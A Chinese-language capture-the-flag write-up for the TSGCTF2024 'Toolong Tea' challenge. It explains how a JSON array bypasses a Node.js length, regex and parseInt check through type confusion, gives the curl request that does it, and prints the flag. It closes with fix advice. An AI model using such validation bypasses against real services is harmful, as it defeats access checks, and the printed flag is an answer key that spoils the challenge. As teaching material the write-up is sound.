# TSGCTF2024 Toolong Tea

## 题目简述

题目给出一个 Hono 编写的 Node.js 页面。前端输入框用 `maxlength="3"` 限制输入长度，后端声称只有提交数字 `65536` 才会返回 flag；但服务端又要求 `num.length === 3`，普通字符串显然无法同时满足这两个条件。

关键代码如下：

```javascript
const { num } = await c.req.json();
if (num.length === 3 && [...num].every((d) => /\d/.test(d))) {
  const i = parseInt(num, 10);
  if (i === 65536) {
    return c.text(`Congratulations! ${flag}`);
  }
}
```

目标是利用 JavaScript 的类型转换差异，让同一个 JSON 值在长度检查、迭代检查和 `parseInt` 中呈现不同效果。

## 解题过程

前端只会把表单字段序列化成字符串，但后端接受任意 JSON，因此可以绕过页面直接发送请求。服务端没有检查 `typeof num === "string"`，所以把 `num` 设置为三元素数组：

```json
{
  "num": ["65536", "1", "1"]
}
```

该数组依次通过三项检查：

1. `num.length === 3`：数组正好有三个元素。
2. `[...num].every((d) => /\d/.test(d))`：三个字符串都至少包含一个数字。这里的正则没有使用锚点，也没有要求每个元素只能由一位数字组成。
3. `parseInt(num, 10)`：`parseInt` 会先把数组转换为字符串，结果为 `"65536,1,1"`；随后从开头解析十进制整数，遇到第一个逗号停止，最终得到 `65536`。

可直接用下面的请求触发成功分支：

```bash
curl -X POST \
  -H 'Content-Type: application/json' \
  -d '{"num":["65536","1","1"]}' \
  'http://HOST:PORT/'
```

服务器返回：

```text
Congratulations! TSGCTF{A_holy_night_with_no_dawn_my_dear...}
```

因此 flag 为：

```text
TSGCTF{A_holy_night_with_no_dawn_my_dear...}
```

## 方法总结

本题是典型的 JavaScript 类型混淆。`length`、可迭代展开和 `parseInt` 分别在不同语义下处理同一个值，而服务端错误地默认客户端传入的一定是字符串。修复时应先做严格类型与格式校验，例如要求 `typeof num === "string"`，并使用 `^\d{5}$` 一类完整匹配；更根本的做法是把输入解析为数值后再验证范围，不让多个隐式转换共同决定安全条件。
